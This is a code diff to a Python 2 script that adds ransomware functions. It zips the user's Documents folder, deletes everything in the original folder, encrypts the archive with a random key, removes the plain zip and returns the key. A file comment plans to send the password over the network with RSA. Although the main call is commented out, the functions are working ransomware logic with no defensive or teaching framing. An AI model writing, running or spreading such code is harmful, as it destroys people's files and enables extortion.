@@ -1,3 +1,6 @@
+# -*- coding: utf-8 -*-
+
+
 '''
 TODO: Encrypt password using RSA and send it over network
         with a new public key.
@@ -121,23 +124,54 @@ def decrypt_RSA(private_key_loc, package):
     decrypted = rsakey.decrypt(b64decode(package)) 
     return decrypted
 
+def clearFolder(path):
+    import shutil
+    import os 
+    if len(os.listdir(path)) > 0:
+        for the_file in os.listdir(path):
+            file_path = os.path.join(path, the_file)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+                else:
+                    shutil.rmtree(file_path, ignore_errors=True)
+            except Exception, e:
+                print e
+        return False
+    else:
+        return True
+
 def encrypt(path=""):
     from os.path import expanduser
     home = expanduser("~")
     path = home + "/Documents"
     zipPath = home + "/Documents.zip"
-    # path = "C:/Users/Matt/Desktop/bob"
-    # zipPath = "C:/Users/Matt/Desktop/bob.zip"
 
     zipdir(path,zipPath)
+
+    empty = clearFolder(path)
+
+    if empty:
+        return "already encrypted"
 
     password = randomword(64)
     salt = os.urandom(8)
     key = PBKDF2(password,salt).read(32)
     encrypt_file(key,zipPath)
+    os.unlink(zipPath)
 
-    return salt,password,path
+    return key
 
+def decrypt(key):
+    from os.path import expanduser
+    home = expanduser("~")
+    path = home + "/Documents.zip.enc"
+    decrypt_file(key,path)
 
 if __name__ == '__main__':
-    print encrypt()
+    print "asdf"
+    # print encrypt()
+    # from os.path import expanduser
+    # home = expanduser("~")
+    # clearFolder(home + "\Documents")
+    # decrypt("]─₧↕‼♠:.{W║ú>÷bm₧⌂p∞≤ìù☻ci╤lß╨░T")
